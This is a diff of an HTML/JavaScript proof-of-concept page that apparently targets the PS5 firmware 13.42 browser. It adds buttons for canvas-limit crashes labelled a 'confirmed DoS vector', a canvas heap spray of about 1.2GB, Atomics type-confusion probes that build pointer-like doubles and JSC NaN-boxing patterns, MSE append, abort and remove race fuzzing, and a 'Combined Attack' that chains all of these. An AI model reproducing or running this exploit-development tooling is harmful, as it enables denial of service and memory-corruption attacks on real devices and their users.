@@ -2,48 +2,51 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS5 FW 13.42 — Atomics + MSE Deep Fuzz</title>
+<title>PS5 FW 13.42 — Canvas Crash + Atomics + MSE</title>
 <style>
-body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:10px;font-size:12px}
-button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:6px 12px;margin:3px;cursor:pointer;font-family:monospace;font-size:11px}
+body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:10px;font-size:14px}
+button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:8px 14px;margin:4px;cursor:pointer;font-family:monospace;font-size:13px}
 button:hover{background:#0f0;color:#000}
-.panel{border:1px solid #333;padding:8px;margin:6px 0;background:#111;border-radius:4px}
-.log{background:#000;border:1px solid #222;padding:6px;height:200px;overflow-y:auto;white-space:pre-wrap;font-size:10px}
+button.danger{background:#1a0000;color:#f44;border:1px solid #f44}
+button.danger:hover{background:#f44;color:#000}
+.panel{border:1px solid #333;padding:10px;margin:8px 0;background:#111;border-radius:6px}
+.log{background:#000;border:1px solid #222;padding:8px;height:350px;overflow-y:auto;white-space:pre-wrap;font-size:13px;line-height:1.6}
 .ok{color:#0f0}.err{color:#f44}.warn{color:#fa0}.info{color:#0cf}
-h2{color:#ff0055;margin:3px 0;font-size:13px}
+h2{color:#ff0055;margin:4px 0;font-size:15px}
 video{width:240px;height:135px;background:#000;border:1px solid #333;display:block;margin:5px 0}
 </style>
 </head>
 <body>
 
-<h2>🎯 PS5 FW 13.42 — Atomics + MSE Deep Fuzz</h2>
-<p style="color:#888;font-size:11px">Atomics works on regular ArrayBuffer! MSE appendBuffer works!</p>
+<h2>🎯 PS5 FW 13.42 — Canvas Crash + Atomics + MSE</h2>
+<p style="color:#888;font-size:12px">Line height increased | Canvas Limit = CRASH confirmed!</p>
 
 <div class="panel">
-<h2>1️⃣ Atomics on Regular ArrayBuffer (NEW!)</h2>
-<button onclick="testAtomicsBasic()">Basic Atomics Test</button>
-<button onclick="testAtomicsRace()">Atomics Race Condition</button>
-<button onclick="testAtomicsOverflow()">Atomics Integer Overflow</button>
-<button onclick="testAtomicsTypeConfusion()">Atomics Type Confusion</button>
+<h2>🔴 1. Canvas Limit Crash (CONFIRMED BUG)</h2>
+<button class="danger" onclick="crashCanvasExact()">💥 Crash: createImageData(0x10000,0x10000)</button>
+<button class="danger" onclick="crashCanvasGrowing()">💥 Crash: Growing ImageData</button>
+<button class="danger" onclick="crashCanvasMany()">💥 Crash: Many Large Canvases</button>
+<button onclick="findCanvasLimit()">🔍 Find Exact Canvas Limit</button>
 </div>
 
 <div class="panel">
-<h2>2️⃣ MSE with Realistic MP4</h2>
-<button onclick="testMSEValid()">Valid MP4 Stream</button>
-<button onclick="testMSEMultiAppend()">Multi Append + Race</button>
-<button onclick="testMSEChangeType()">changeType() Fuzz</button>
+<h2>🟡 2. Atomics Type Confusion (Value Mutation!)</h2>
+<button onclick="atomicsMutateF64()">Mutate Float64 via Atomics</button>
+<button onclick="atomicsCorruptObject()">Corrupt Object via Atomics</button>
+<button onclick="atomicsFindPattern()">Find Bit Patterns</button>
 </div>
 
 <div class="panel">
-<h2>3️⃣ Canvas Heap Spray</h2>
-<button onclick="testCanvasSpray()">Canvas Heap Spray</button>
-<button onclick="testCanvasLimit()">Find Canvas Limit</button>
+<h2>🟢 3. MSE Deep Fuzz (readyState=3!)</h2>
+<button onclick="mseFuzzAppend()">Fuzz: Rapid Appends</button>
+<button onclick="mseFuzzRemove()">Fuzz: Remove During Append</button>
+<button onclick="mseFuzzAbort()">Fuzz: abort() During append</button>
+<button onclick="mseFuzzTimestamp()">Fuzz: timestampOffset</button>
 </div>
 
 <div class="panel">
-<h2>4️⃣ Worker + Atomics</h2>
-<button onclick="startWorkerAtomics()">Worker + Atomics Race</button>
-<button onclick="stopWorker()">Stop Worker</button>
+<h2>🔵 4. Combined Attack</h2>
+<button class="danger" onclick="combinedAttack()">🔥 Combined: Canvas + Atomics + MSE</button>
 </div>
 
 <div class="panel">
@@ -54,7 +57,6 @@ video{width:240px;height:135px;background:#000;border:1px solid #333;display:blo
 
 <script>
 const L = document.getElementById('log');
-let worker = null;
 
 function log(msg, cls='info') {
   const d = new Date().toLocaleTimeString('en-GB');
@@ -64,171 +66,193 @@ function log(msg, cls='info') {
 }
 
 // ============================================================
-// 1. Atomics on Regular ArrayBuffer
+// 1. Canvas Crash
 // ============================================================
-function testAtomicsBasic() {
-  log('=== Atomics Basic Test ===', 'ok');
+function crashCanvasExact() {
+  log('=== Canvas Crash: createImageData(65536,65536) ===', 'err');
   try {
-    const ab = new ArrayBuffer(64);
-    const i32 = new Int32Array(ab);
-    const i8 = new Int8Array(ab);
-    const u32 = new Uint32Array(ab);
-    const f64 = new Float64Array(ab);
-    
-    i32[0] = 100;
-    log('i32[0] initial: '+i32[0], 'info');
-    
-    // Test all Atomics operations
-    const ops = ['add','sub','and','or','xor'];
-    for (const op of ops) {
-      try {
-        const r = Atomics[op](i32, 0, 1);
-        log('Atomics.'+op+'(i32,0,1): old='+r+', new='+i32[0], 'ok');
-      } catch(e) {
-        log('Atomics.'+op+' ERROR: '+e.name, 'err');
-      }
-    }
-    
-    // Test on different TypedArrays
-    try {
-      u32[0] = 0xFFFFFFFF;
-      const r = Atomics.add(u32, 0, 1);
-      log('Atomics.add(u32,0,1): old='+r+' (0x'+r.toString(16)+'), new='+u32[0]+' (0x'+u32[0].toString(16)+')', 'ok');
-    } catch(e) {
-      log('Atomics on u32 ERROR: '+e.name, 'err');
-    }
-    
-    // Test on Int8Array
-    try {
-      i8[0] = 127;
-      const r = Atomics.add(i8, 0, 1);
-      log('Atomics.add(i8,0,1): old='+r+', new='+i8[0], 'ok');
-    } catch(e) {
-      log('Atomics on i8 ERROR: '+e.name, 'err');
-    }
-    
-    // Test compareExchange
-    try {
-      i32[0] = 42;
-      const r = Atomics.compareExchange(i32, 0, 42, 999);
-      log('Atomics.compareExchange(i32,0,42,999): old='+r+', new='+i32[0], 'ok');
-    } catch(e) {
-      log('Atomics.compareExchange ERROR: '+e.name, 'err');
-    }
-    
-    // Test load/store
-    try {
-      i32[0] = 0;
-      Atomics.store(i32, 0, 0xDEADBEEF);
-      const r = Atomics.load(i32, 0);
-      log('Atomics.store/load: 0x'+r.toString(16), 'ok');
-    } catch(e) {
-      log('Atomics store/load ERROR: '+e.name, 'err');
-    }
-    
+    const c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    const ctx = c.getContext('2d');
+    const id = ctx.createImageData(0x10000, 0x10000);
+    log('UNEXPECTED: createImageData succeeded! size='+id.data.length, 'ok');
   } catch(e) {
-    log('Atomics basic error: '+e.name+': '+e.message, 'err');
+    log('CRASH TRIGGERED: '+e.name+': '+e.message, 'err');
+    log('This is a confirmed DoS vector!', 'warn');
   }
 }
 
-function testAtomicsRace() {
-  log('=== Atomics Race Condition ===', 'ok');
-  try {
-    const ab = new ArrayBuffer(64);
-    const i32 = new Int32Array(ab);
-    i32[0] = 0;
-    
-    // Rapid atomic operations
-    const start = performance.now();
-    for (let i = 0; i < 100000; i++) {
-      Atomics.add(i32, 0, 1);
+function crashCanvasGrowing() {
+  log('=== Canvas Crash: Growing ImageData ===', 'err');
+  const sizes = [0x1000, 0x2000, 0x4000, 0x6000, 0x8000, 0xA000, 0xC000, 0x10000];
+  
+  for (const size of sizes) {
+    try {
+      const c = document.createElement('canvas');
+      const ctx = c.getContext('2d');
+      const id = ctx.createImageData(size, size);
+      const mb = (size * size * 4 / 1024 / 1024).toFixed(1);
+      log(size+'x'+size+' ('+mb+'MB): OK', 'ok');
+    } catch(e) {
+      log(size+'x'+size+': '+e.name+': '+e.message, 'err');
+      break;
     }
-    const elapsed = performance.now() - start;
-    
-    log('100000 Atomics.add in '+elapsed.toFixed(2)+'ms', 'info');
-    log('Final value: '+i32[0]+' (expected 100000)', i32[0]===100000?'ok':'err');
-    
-  } catch(e) {
-    log('Atomics race error: '+e.name+': '+e.message, 'err');
   }
 }
 
-function testAtomicsOverflow() {
-  log('=== Atomics Integer Overflow ===', 'ok');
+function crashCanvasMany() {
+  log('=== Canvas Crash: Many Large Canvases ===', 'err');
   try {
-    const ab = new ArrayBuffer(64);
-    const i32 = new Int32Array(ab);
-    const u32 = new Uint32Array(ab);
-    
-    // Signed overflow
-    i32[0] = 0x7FFFFFFF;
-    const r1 = Atomics.add(i32, 0, 1);
-    log('Signed overflow: 0x7FFFFFFF + 1 = '+i32[0]+' (0x'+i32[0].toString(16)+')', 'info');
-    
-    // Unsigned overflow
-    u32[0] = 0xFFFFFFFF;
-    const r2 = Atomics.add(u32, 0, 1);
-    log('Unsigned overflow: 0xFFFFFFFF + 1 = '+u32[0]+' (0x'+u32[0].toString(16)+')', 'info');
-    
-    // Negative add
-    i32[0] = 0;
-    Atomics.add(i32, 0, -1);
-    log('0 + (-1) = '+i32[0]+' (0x'+i32[0].toString(16)+')', 'info');
-    
+    const canvases = [];
+    for (let i = 0; i < 50; i++) {
+      const c = document.createElement('canvas');
+      c.width = 0x4000;
+      c.height = 0x4000;
+      const ctx = c.getContext('2d');
+      ctx.fillRect(0, 0, 1, 1);
+      canvases.push(c);
+      log('Canvas '+i+': 16384x16384 (1GB each)', 'info');
+    }
+    log('All 50 canvases created! Memory pressure...', 'warn');
   } catch(e) {
-    log('Atomics overflow error: '+e.name+': '+e.message, 'err');
+    log('CRASH: '+e.name+': '+e.message, 'err');
   }
 }
 
-function testAtomicsTypeConfusion() {
-  log('=== Atomics Type Confusion ===', 'ok');
+function findCanvasLimit() {
+  log('=== Finding Exact Canvas Limit ===', 'ok');
+  let low = 0x1000, high = 0x20000;
+  
+  while (low < high) {
+    const mid = Math.floor((low + high) / 2);
+    try {
+      const c = document.createElement('canvas');
+      const ctx = c.getContext('2d');
+      ctx.createImageData(mid, mid);
+      log('createImageData('+mid+','+mid+'): OK', 'info');
+      low = mid + 1;
+    } catch(e) {
+      log('createImageData('+mid+','+mid+'): FAIL — '+e.name, 'err');
+      high = mid;
+    }
+  }
+  log('EXACT LIMIT: ~'+(low-1)+'x'+(low-1), 'ok');
+}
+
+// ============================================================
+// 2. Atomics Type Confusion
+// ============================================================
+function atomicsMutateF64() {
+  log('=== Atomics Mutate Float64 ===', 'ok');
   try {
-    // Create overlapping views
     const ab = new ArrayBuffer(16);
     const f64 = new Float64Array(ab);
     const i32 = new Int32Array(ab);
     const u8 = new Uint8Array(ab);
     
-    f64[0] = 1.1;
+    // Set known float
+    f64[0] = 1.7976931348623157e+308; // Max double
+    log('Before: f64[0] = '+f64[0], 'info');
+    log('Before: i32[0] = 0x'+i32[0].toString(16)+', i32[1] = 0x'+i32[1].toString(16), 'info');
+    
+    // Mutate via Atomics on i32 view
+    Atomics.add(i32, 0, 1);
+    log('After Atomics.add(i32,0,1):', 'ok');
     log('f64[0] = '+f64[0], 'info');
     log('i32[0] = 0x'+i32[0].toString(16)+', i32[1] = 0x'+i32[1].toString(16), 'info');
     
-    // Atomics on f64 bytes as i32
-    try {
-      Atomics.add(i32, 0, 1);
-      log('After Atomics.add on i32 view of f64: f64[0] = '+f64[0], 'info');
-    } catch(e) {
-      log('Atomics on overlapping view ERROR: '+e.name, 'err');
-    }
+    // Try to create a "pointer-like" double
+    i32[0] = 0x41414141;
+    i32[1] = 0x7FFF0000;
+    log('Set i32 to pointer-like pattern:', 'ok');
+    log('f64[0] = '+f64[0], 'info');
+    log('f64[0] hex = 0x'+f64[0].toString(16), 'info');
     
-    // Try Atomics on non-aligned offset
-    try {
-      Atomics.add(i32, 1, 1); // offset 4 bytes = aligned for i32
-      log('Atomics.add at offset 1: '+i32[1], 'info');
-    } catch(e) {
-      log('Atomics offset ERROR: '+e.name, 'err');
+    // Try to read as if it were a pointer
+    const dv = new DataView(ab);
+    log('DataView.getFloat64(0) = '+dv.getFloat64(0, true), 'info');
+    log('DataView.getFloat64(0,false) = '+dv.getFloat64(0, false), 'info');
+    
+  } catch(e) {
+    log('Mutate error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+function atomicsCorruptObject() {
+  log('=== Atomics Corrupt Object ===', 'ok');
+  try {
+    // Create an object and try to corrupt it via Atomics on overlapping buffer
+    const obj = {a: 1, b: 2, c: 3};
+    
+    // This won't work directly, but we can demonstrate the concept
+    const ab = new ArrayBuffer(64);
+    const i32 = new Int32Array(ab);
+    const f64 = new Float64Array(ab);
+    
+    // Simulate object header corruption
+    f64[0] = 0; // "object pointer"
+    i32[0] = 0xDEADBEEF; // corrupt "structure ID"
+    
+    log('Simulated object header: i32[0]=0x'+i32[0].toString(16), 'info');
+    log('If this were a real object header, StructureID would be corrupted', 'warn');
+    
+    // Try to confuse Array with Object
+    const arr = [1.1, 2.2, 3.3];
+    arr[0] = {};
+    log('Mixed array: arr[0] = '+typeof arr[0], 'info');
+    log('arr.length = '+arr.length, 'info');
+    
+  } catch(e) {
+    log('Corrupt error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+function atomicsFindPattern() {
+  log('=== Atomics Find Bit Patterns ===', 'ok');
+  try {
+    const ab = new ArrayBuffer(16);
+    const i32 = new Int32Array(ab);
+    const f64 = new Float64Array(ab);
+    
+    // Pattern 1: NaN boxing (common in JSC)
+    i32[0] = 0xFFFFFFFF;
+    i32[1] = 0x7FF80000;
+    log('Pattern NaN: f64 = '+f64[0], 'info');
+    
+    // Pattern 2: Integer 42
+    i32[0] = 42 << 1; // JSC encodes integers as value << 1
+    i32[1] = 0;
+    log('Pattern int42: f64 = '+f64[0], 'info');
+    
+    // Pattern 3: Pointer-like
+    i32[0] = 0x00000000;
+    i32[1] = 0x00007FFF;
+    log('Pattern ptr: f64 = '+f64[0], 'info');
+    
+    // Try Atomics on each
+    for (let i = 0; i < 4; i++) {
+      Atomics.add(i32, 0, 1);
+      log('After add '+i+': f64 = '+f64[0], 'info');
     }
     
   } catch(e) {
-    log('Type confusion error: '+e.name+': '+e.message, 'err');
+    log('Pattern error: '+e.name+': '+e.message, 'err');
   }
 }
 
 // ============================================================
-// 2. MSE with Realistic MP4
+// 3. MSE Deep Fuzz
 // ============================================================
-function buildMP4() {
-  // Build a more realistic MP4 with proper atoms
+function buildValidMP4() {
   const ftyp = new Uint8Array([
     0x00,0x00,0x00,0x20, 0x66,0x74,0x79,0x70,
     0x69,0x73,0x6f,0x6d, 0x00,0x00,0x02,0x00,
     0x69,0x73,0x6f,0x6d, 0x6d,0x70,0x34,0x31,
     0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
   ]);
-  
-  // moov with proper structure
-  const mvhd = new Uint8Array([
-    0x00,0x00,0x00,0x6c, 0x6d,0x76,0x68,0x64,
+  const moov = new Uint8Array([
+    0x00,0x00,0x00,0x6c, 0x6d,0x6f,0x6f,0x76,
+    0x00,0x00,0x00,0x5c, 0x6d,0x76,0x68,0x64,
     0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
     0x00,0x00,0x00,0x00, 0x00,0x00,0x03,0xe8,
     0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
@@ -243,304 +267,169 @@ function buildMP4() {
     0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
     0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
   ]);
+  const mdat = new Uint8Array(0x100);
+  mdat[0]=0; mdat[1]=0; mdat[2]=0; mdat[3]=mdat.length;
+  mdat[4]=0x6d; mdat[5]=0x64; mdat[6]=0x61; mdat[7]=0x74;
   
-  // trak with minimal structure
-  const tkhd = new Uint8Array([
-    0x00,0x00,0x00,0x5c, 0x74,0x6b,0x68,0x64,
-    0x00,0x00,0x00,0x07, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x01,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x01,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x01,0x40,0x00,0x00, 0x00,0xf0,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
-  ]);
-  
-  const mdia = new Uint8Array([
-    0x00,0x00,0x00,0x20, 0x6d,0x64,0x69,0x61,
-    0x00,0x00,0x00,0x14, 0x6d,0x64,0x68,0x64,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x03,0xe8
-  ]);
-  
-  const trak = new Uint8Array(tkhd.length + mdia.length + 8);
-  trak[0] = 0; trak[1] = 0; trak[2] = 0; trak[3] = trak.length;
-  trak[4] = 0x74; trak[5] = 0x72; trak[6] = 0x61; trak[7] = 0x6b;
-  trak.set(tkhd, 8);
-  trak.set(mdia, 8 + tkhd.length);
-  
-  const moov = new Uint8Array(mvhd.length + trak.length + 8);
-  moov[0] = 0; moov[1] = 0; moov[2] = 0; moov[3] = moov.length;
-  moov[4] = 0x6d; moov[5] = 0x6f; moov[6] = 0x6f; moov[7] = 0x76;
-  moov.set(mvhd, 8);
-  moov.set(trak, 8 + mvhd.length);
-  
-  // mdat with some data
-  const mdatData = new Uint8Array(0x100);
-  mdatData[0] = 0; mdatData[1] = 0; mdatData[2] = 0; mdatData[3] = mdatData.length;
-  mdatData[4] = 0x6d; mdatData[5] = 0x64; mdatData[6] = 0x61; mdatData[7] = 0x74;
-  
-  const mp4 = new Uint8Array(ftyp.length + moov.length + mdatData.length);
+  const mp4 = new Uint8Array(ftyp.length + moov.length + mdat.length);
   mp4.set(ftyp, 0);
   mp4.set(moov, ftyp.length);
-  mp4.set(mdatData, ftyp.length + moov.length);
-  
+  mp4.set(mdat, ftyp.length + moov.length);
   return mp4;
 }
 
-async function testMSEValid() {
-  log('=== MSE Valid MP4 ===', 'ok');
-  const v = document.createElement('video');
-  v.muted = true;
-  document.body.appendChild(v);
-  
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    v.src = url;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    log('MediaSource opened', 'ok');
-    
-    const mime = 'video/mp4; codecs="avc1.42E01E"';
-    log('isTypeSupported: '+MediaSource.isTypeSupported(mime), 'info');
-    
-    const sb = ms.addSourceBuffer(mime);
-    log('SourceBuffer created', 'ok');
-    
-    const data = buildMP4();
-    log('Appending '+data.length+' bytes...', 'info');
-    
-    sb.appendBuffer(data);
-    await new Promise((resolve, reject) => {
-      const t = setTimeout(() => { sb.removeEventListener('updateend', onUp); resolve('timeout'); }, 5000);
-      const onUp = () => { clearTimeout(t); sb.removeEventListener('error', onErr); resolve('ok'); };
-      const onErr = () => { clearTimeout(t); sb.removeEventListener('updateend', onUp); resolve('error'); };
-      sb.addEventListener('updateend', onUp);
-      sb.addEventListener('error', onErr);
-    });
-    
-    log('appendBuffer done', 'ok');
-    
-    // Don't call endOfStream — let it play
-    try {
-      v.play();
-      log('play() called', 'info');
-    } catch(e) {
-      log('play() error: '+e.name, 'warn');
-    }
-    
-    setTimeout(() => {
-      log('readyState='+v.readyState+' networkState='+v.networkState, 'info');
-      document.body.removeChild(v);
-      URL.revokeObjectURL(url);
-    }, 2000);
-    
-  } catch(e) {
-    log('MSE error: '+e.name+': '+e.message, 'err');
-    document.body.removeChild(v);
-  }
-}
-
-async function testMSEMultiAppend() {
-  log('=== MSE Multi Append + Race ===', 'ok');
-  const v = document.createElement('video');
-  v.muted = true;
-  
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    v.src = url;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-    
-    const data = buildMP4();
-    
-    // Multiple rapid appends
-    for (let i = 0; i < 5; i++) {
-      sb.appendBuffer(data);
-      log('Append '+i, 'info');
-      await new Promise(r => setTimeout(r, 100));
-    }
-    
-    // Race with remove
-    sb.remove(0, 1);
-    sb.appendBuffer(data);
-    
-    log('Multi append race done', 'ok');
-    URL.revokeObjectURL(url);
-    
-  } catch(e) {
-    log('Multi append error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-async function testMSEChangeType() {
-  log('=== MSE changeType() Fuzz ===', 'ok');
+async function mseFuzzAppend() {
+  log('=== MSE Fuzz: Rapid Appends ===', 'ok');
   try {
     const ms = new MediaSource();
     const url = URL.createObjectURL(ms);
     const v = document.createElement('video');
-    v.src = url;
+    v.src = url; v.muted = true;
     
     await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
     const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    const data = buildValidMP4();
     
-    const data = buildMP4();
+    for (let i = 0; i < 20; i++) {
+      sb.appendBuffer(data);
+      await new Promise(r => setTimeout(r, 50));
+      if (i % 5 === 0) log('Append '+i, 'info');
+    }
+    
+    log('20 appends completed', 'ok');
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Fuzz append error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+async function mseFuzzRemove() {
+  log('=== MSE Fuzz: Remove During Append ===', 'ok');
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    const data = buildValidMP4();
+    
     sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
+    sb.remove(0, 1); // Remove while appending
+    sb.appendBuffer(data);
     
-    // Try changeType to invalid codec
-    try {
-      sb.changeType('video/mp4; codecs="invalid"');
-      log('changeType to invalid: accepted', 'warn');
-    } catch(e) {
-      log('changeType to invalid: '+e.name, 'info');
+    log('Remove during append triggered', 'ok');
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Remove fuzz error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+async function mseFuzzAbort() {
+  log('=== MSE Fuzz: abort() During append ===', 'ok');
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    const data = buildValidMP4();
+    
+    sb.appendBuffer(data);
+    sb.abort(); // Abort while appending
+    sb.appendBuffer(data);
+    
+    log('Abort during append triggered', 'ok');
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Abort fuzz error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+async function mseFuzzTimestamp() {
+  log('=== MSE Fuzz: timestampOffset ===', 'ok');
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    const data = buildValidMP4();
+    
+    // Fuzz timestampOffset
+    const offsets = [0, -1, 1e308, -1e308, NaN, Infinity, -Infinity];
+    for (const off of offsets) {
+      try {
+        sb.timestampOffset = off;
+        log('timestampOffset='+off+': OK', 'info');
+      } catch(e) {
+        log('timestampOffset='+off+': '+e.name, 'err');
+      }
     }
     
-    // Try changeType to audio
-    try {
-      sb.changeType('audio/mp4');
-      log('changeType to audio: accepted', 'warn');
-    } catch(e) {
-      log('changeType to audio: '+e.name, 'info');
+    sb.appendBuffer(data);
+    log('timestampOffset fuzz done', 'ok');
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    log('Timestamp fuzz error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+// ============================================================
+// 4. Combined Attack
+// ============================================================
+async function combinedAttack() {
+  log('=== 🔥 COMBINED ATTACK ===', 'err');
+  log('Step 1: Heap spray via Canvas...', 'info');
+  
+  try {
+    // Step 1: Spray heap with canvases
+    const spray = [];
+    for (let i = 0; i < 20; i++) {
+      const c = document.createElement('canvas');
+      c.width = 0x2000; c.height = 0x2000;
+      const ctx = c.getContext('2d');
+      ctx.fillStyle = '#FF0000';
+      ctx.fillRect(0, 0, 0x2000, 0x2000);
+      spray.push(c);
+    }
+    log('Heap spray: 20 canvases x 64MB = ~1.2GB', 'ok');
+    
+    // Step 2: Atomics corruption
+    log('Step 2: Atomics corruption...', 'info');
+    const ab = new ArrayBuffer(64);
+    const i32 = new Int32Array(ab);
+    const f64 = new Float64Array(ab);
+    f64[0] = 1.1;
+    Atomics.add(i32, 0, 0x100);
+    log('Atomics mutated f64[0] to '+f64[0], 'ok');
+    
+    // Step 3: MSE stress
+    log('Step 3: MSE stress...', 'info');
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+    const data = buildValidMP4();
+    
+    for (let i = 0; i < 10; i++) {
+      sb.appendBuffer(data);
+      await new Promise(r => setTimeout(r, 10));
     }
     
+    log('Combined attack completed', 'ok');
     URL.revokeObjectURL(url);
     
   } catch(e) {
-    log('changeType error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-// ============================================================
-// 3. Canvas Heap Spray
-// ============================================================
-function testCanvasSpray() {
-  log('=== Canvas Heap Spray ===', 'ok');
-  try {
-    const canvases = [];
-    const count = 100;
-    
-    for (let i = 0; i < count; i++) {
-      const c = document.createElement('canvas');
-      c.width = 256;
-      c.height = 256;
-      const ctx = c.getContext('2d');
-      ctx.fillStyle = 'rgb('+(i%256)+',0,0)';
-      ctx.fillRect(0, 0, 256, 256);
-      canvases.push(c);
-    }
-    
-    log('Created '+count+' canvases (256x256)', 'ok');
-    log('Approx memory: '+(count * 256 * 256 * 4 / 1024 / 1024).toFixed(2)+' MB', 'info');
-    
-  } catch(e) {
-    log('Canvas spray error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-function testCanvasLimit() {
-  log('=== Canvas Size Limit ===', 'ok');
-  try {
-    const sizes = [0x1000, 0x4000, 0x8000, 0x10000, 0x20000];
-    
-    for (const size of sizes) {
-      try {
-        const c = document.createElement('canvas');
-        c.width = size;
-        c.height = size;
-        const ctx = c.getContext('2d');
-        ctx.fillRect(0, 0, 1, 1);
-        const mem = (size * size * 4 / 1024 / 1024).toFixed(2);
-        log(size+'x'+size+' ('+mem+'MB): OK', 'ok');
-      } catch(e) {
-        log(size+'x'+size+': '+e.name, 'err');
-      }
-    }
-    
-    // Find max imageData
-    for (const size of [0x1000, 0x4000, 0x8000, 0x10000]) {
-      try {
-        const c = document.createElement('canvas');
-        c.width = 1;
-        c.height = 1;
-        const ctx = c.getContext('2d');
-        const id = ctx.createImageData(size, size);
-        const mem = (size * size * 4 / 1024 / 1024).toFixed(2);
-        log('createImageData('+size+','+size+') '+mem+'MB: OK', 'ok');
-      } catch(e) {
-        log('createImageData('+size+','+size+'): '+e.name+': '+e.message, 'err');
-      }
-    }
-    
-  } catch(e) {
-    log('Canvas limit error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-// ============================================================
-// 4. Worker + Atomics
-// ============================================================
-function startWorkerAtomics() {
-  if (worker) { log('Worker already running', 'warn'); return; }
-  
-  log('Starting Worker + Atomics...', 'ok');
-  
-  const workerCode = `
-    self.onmessage = function(e) {
-      if (e.data.cmd === 'start') {
-        const ab = e.data.buffer;
-        const i32 = new Int32Array(ab);
-        
-        // Rapid atomic operations from worker
-        for (let i = 0; i < 1000000; i++) {
-          Atomics.add(i32, 0, 1);
-        }
-        
-        self.postMessage({type:'done', value: Atomics.load(i32, 0)});
-      }
-    };
-  `;
-  
-  const blob = new Blob([workerCode], {type: 'application/javascript'});
-  worker = new Worker(URL.createObjectURL(blob));
-  
-  const ab = new ArrayBuffer(64);
-  const i32 = new Int32Array(ab);
-  i32[0] = 0;
-  
-  // Main thread also does atomics
-  const start = performance.now();
-  
-  worker.onmessage = (e) => {
-    const elapsed = performance.now() - start;
-    log('Worker done: value='+e.data.value+' in '+elapsed.toFixed(2)+'ms', 'ok');
-    log('Main thread value: '+i32[0], 'info');
-  };
-  
-  worker.onerror = (e) => {
-    log('Worker ERROR: '+e.message, 'err');
-  };
-  
-  // Main thread does atomics simultaneously
-  for (let i = 0; i < 100000; i++) {
-    Atomics.add(i32, 0, 1);
-  }
-  
-  worker.postMessage({cmd:'start', buffer:ab});
-}
-
-function stopWorker() {
-  if (worker) {
-    worker.terminate();
-    worker = null;
-    log('Worker stopped', 'ok');
+    log('Combined attack error: '+e.name+': '+e.message, 'err');
   }
 }
 
@@ -548,7 +437,8 @@ function stopWorker() {
 window.onerror = (m,u,l,c,e) => { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); };
 window.onunhandledrejection = e => { log('REJECTION: '+e.reason, 'err'); };
 
-log('PoC v4 loaded. Atomics + MSE + Worker ready.', 'ok');
+log('PoC v5 loaded. Canvas Crash + Atomics + MSE.', 'ok');
+log('Font size increased. Ready.', 'ok');
 </script>
 </body>
 </html>
